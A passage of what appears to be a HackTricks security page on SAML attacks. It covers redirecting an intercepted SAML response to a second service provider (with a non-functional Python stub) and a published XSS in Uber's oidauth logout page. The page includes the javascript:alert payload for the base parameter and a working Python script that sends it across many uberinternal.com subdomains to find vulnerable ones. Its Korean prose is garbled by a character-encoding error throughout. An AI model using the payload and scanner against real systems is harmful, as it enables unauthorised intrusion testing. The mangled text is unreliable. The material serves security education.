ì´ëŸ¬í•œ ì¡°ê±´ í•˜ì—ì„œ ê³µê²© ê³¼ì •ì€ ê°„ë‹¨í•©ë‹ˆë‹¤. ê³µìœ ëœ ì‹ ì› ì œê³µìë¥¼ í†µí•´ SP-Legitê³¼ì˜ ì‹¤ì œ ì„¸ì…˜ì´ ì‹œì‘ë©ë‹ˆë‹¤. ì‹ ì› ì œê³µìì—ì„œ SP-Legitìœ¼ë¡œì˜ SAML ì‘ë‹µì´ ê°€ë¡œì±„ì§‘ë©ë‹ˆë‹¤. ì´ ê°€ë¡œì±„ì§„ SAML ì‘ë‹µì€ ì›ë˜ SP-Legitì„ ìœ„í•´ ì˜ë„ë˜ì—ˆì§€ë§Œ SP-Targetë¡œ ë¦¬ë””ë ‰ì…˜ë©ë‹ˆë‹¤. ì´ ê³µê²©ì˜ ì„±ê³µì€ SP-Targetì´ Assertionì„ ìˆ˜ë½í•˜ê³  SP-Legitì— ì‚¬ìš©ëœ ë™ì¼í•œ ê³„ì • ì´ë¦„ìœ¼ë¡œ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ ì¸¡ì •ë©ë‹ˆë‹¤.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## ë¡œê·¸ì•„ì›ƒ ê¸°ëŠ¥ì—ì„œì˜ XSS

ì›ë³¸ ì—°êµ¬ëŠ” [ì´ ë§í¬](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)ë¥¼ í†µí•´ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë””ë ‰í† ë¦¬ ë¬´ì°¨ë³„ ëŒ€ì… ê³¼ì •ì—ì„œ ë¡œê·¸ì•„ì›ƒ í˜ì´ì§€ë¥¼ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
í•´ë‹¹ ë§í¬ì— ì ‘ì†í•˜ë©´ ë‹¤ìŒìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ë©ë‹ˆë‹¤:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
ì´ë¡œì¨ `base` ë§¤ê°œë³€ìˆ˜ê°€ URLì„ í—ˆìš©í•œë‹¤ëŠ” ê²ƒì´ ë°í˜€ì¡ŒìŠµë‹ˆë‹¤. ì´ë¥¼ ê³ ë ¤í•˜ì—¬ URLì„ `javascript:alert(123);`ë¡œ ëŒ€ì²´í•˜ì—¬ XSS (í¬ë¡œìŠ¤ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…) ê³µê²©ì„ ì‹œë„í•˜ëŠ” ì•„ì´ë””ì–´ê°€ ë‚˜ì™”ìŠµë‹ˆë‹¤.


### ëŒ€ê·œëª¨ ì•…ìš©

[ì´ ì—°êµ¬](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)ì—ì„œ:

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ `uberinternal.com`ì˜ í•˜ìœ„ ë„ë©”ì¸ì„ ë¶„ì„í•˜ì—¬ ë™ì¼í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ëŠ” ë„ë©”ì¸ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤. ì´í›„ `oidauth/prompt` í˜ì´ì§€ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ê°€ ê°œë°œë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë°ì´í„°ë¥¼ ì…ë ¥í•˜ê³  ì¶œë ¥ì— ë°˜ì˜ë˜ëŠ”ì§€ í™•ì¸í•˜ì—¬ XSS (í¬ë¡œìŠ¤ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…)ë¥¼ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤. ì…ë ¥ì´ ì‹¤ì œë¡œ ë°˜ì˜ë˜ëŠ” ê²½ìš°, ìŠ¤í¬ë¦½íŠ¸ëŠ” í•´ë‹¹ í˜ì´ì§€ë¥¼ ì·¨ì•½ì ì´ ìˆëŠ” ê²ƒìœ¼ë¡œ í‘œì‹œí•©ë‹ˆë‹¤.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## ì°¸ê³  ìë£Œ
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
